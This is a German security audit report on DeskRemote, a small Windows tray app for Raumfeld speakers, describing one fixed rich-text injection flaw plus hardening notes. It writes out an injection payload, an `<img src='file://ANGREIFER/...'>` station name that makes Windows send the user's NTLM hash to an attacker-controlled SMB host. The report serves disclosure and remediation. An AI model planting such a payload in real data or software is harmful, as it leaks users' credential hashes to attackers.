# Security Audit – DeskRemote (Lauf 1, 13.11.2026)

*Damals noch unter dem Arbeitstitel „Raumfeld Desk“; Pfade wie `ui/search.py` beziehen sich auf das Paket `src/deskremote`.*

## Zusammenfassung
Kleine Windows-Tray-App (~2.000 Zeilen Python/PySide6), die Teufel-Raumfeld-Lautsprecher im Heimnetz steuert. Die Netzwerkseite ist für eine UPnP-Steuerung überdurchschnittlich gehärtet (defusedxml, Weiterleitungen nur same-origin, SSDP-Absenderprüfung, Geräteadressen nur im Heimnetz). Gefunden wurde **eine ausnutzbare Lücke mittlerer Schwere**: Sendernamen aus dem öffentlichen Senderverzeichnis wurden von Qt als HTML ausgewertet, was über ein präpariertes `<img src='file://…'>` den NTLM-Hash des Windows-Benutzers an einen fremden Server senden konnte. **Behoben** (in v1.0.0), mit Regressionstests.

## Vergleichsbasis
Raumfeld-/Sonos-Controller, Home-Assistant-Integrationen, UPnP-Control-Points (BubbleUPnP). Alle vertrauen dem LAN prinzipbedingt (UPnP ohne Authentifizierung). Bewertet wurde daher vor allem, was **über** dieses Design-Vertrauen hinausgeht – etwa Wirkung auf den Windows-Rechner oder Daten aus dem Internet.

## Findings

| Schwere | Titel | Status |
|---|---|---|
| MEDIUM | Qt-Rich-Text-Injection über Sendernamen → NTLM-Hash-Leak per SMB | behoben |

### MEDIUM – Qt-Rich-Text-Injection über Sendernamen
- **Wo:** `ui/search.py:129` (`QLabel(st.name)`), `ui/popup.py:205` (Titel), `ui/popup.py:133` (Ziel-Raum) – Stand vor v1.0.0.
- **Angriff:** Internet-Angreifer legt bei radio-browser.info (offene API) einen Sender `Radio FM4 <img src='file://ANGREIFER/s/a.png'>` an. Sucht das Opfer „FM4“, öffnet Windows eine SMB-Verbindung zum Angreifer und sendet den Net-NTLMv2-Hash des angemeldeten Benutzers. Als Favorit gespeichert, wiederholt sich das bei jedem Öffnen des Fensters. Nebenwirkung: GUI hängt ~20 s pro Treffer.
- **Belege:** Lokale Reproduktion (Bild wird geladen, sizeHint 23×16 → 326×203); Harness des Prüfers sah `203.0.113.5:445 SynSent` vom Kernel-SMB-Client.
- **Fix:** `PlainLabel` (immer `Qt.PlainText`) für alle Beschriftungen; Bereinigung externer Namen (Steuer-/Bidi-Zeichen, Längenlimit); Tests prüfen, dass jede Beschriftung in allen Fenstern reiner Text ist.

## Hardening-Notizen (keine Findings)
- **Umgesetzt:** Steuerzeichen werden aus DIDL-Metadaten entfernt; `config.json` wird streng typgeprüft (falsche Typen/Nicht-http-Favoriten → Standardwerte statt Absturz).
- **Offen, bewusst:** XML-Größenlimit greift erst nach vollständigem Lesen; ein bösartiges Gerät im LAN könnte Speicher füllen oder den Worker per Slow-Drip blockieren (LAN-Vertrauen, wie bei allen UPnP-Clients).
- **Offen, bewusst:** Stream-Adressen aus dem Senderverzeichnis werden vom Lautsprecher abgerufen – über einen Redirector könnte ein Angreifer den Lautsprecher blinde GET-Anfragen ins LAN schicken lassen. Betrifft jeden Internetradio-Client gleich.
- **Offen, bewusst:** Geräteadressen dürfen jede private IP sein (auch der eigene PC); ein gefälschter Host könnte blinde Anfragen an lokale Dienste auslösen (LAN-Vertrauen).

## Positive Muster
defusedxml mit `forbid_dtd` und Größenlimit · Weiterleitungen nur auf denselben Host · SSDP: ST + LOCATION==Absender + private IP · controlURL nur same-origin · SOAP-/DIDL-Werte XML-escaped · Aktions-Allowlist im Worker · httpx verhindert CRLF-Header-Injection · atomares Config-Schreiben · keine exec/eval/pickle/Shell-Senken · Hotkey-Filter prüft eigene IDs.

## Methodik und Grenzen
Verkleinerte Fassung des Skills, passend zur Codegröße und zum Wunsch nach sparsamem Agenteneinsatz: Phase 1 durch den Autor, Phase 2 durch **einen** unabhängigen Prüfer (Opus) mit Harness-Läufen, Phase 3 als eigene dynamische Reproduktion, Phase 6 als Selbstprüfung der Zeilenangaben gegen den damaligen Stand vor v1.0.0 (kein separater Verifizierer). Ein Audit-Lauf findet erfahrungsgemäß nur einen Teil – ein zweiter Lauf erhöht die Abdeckung.
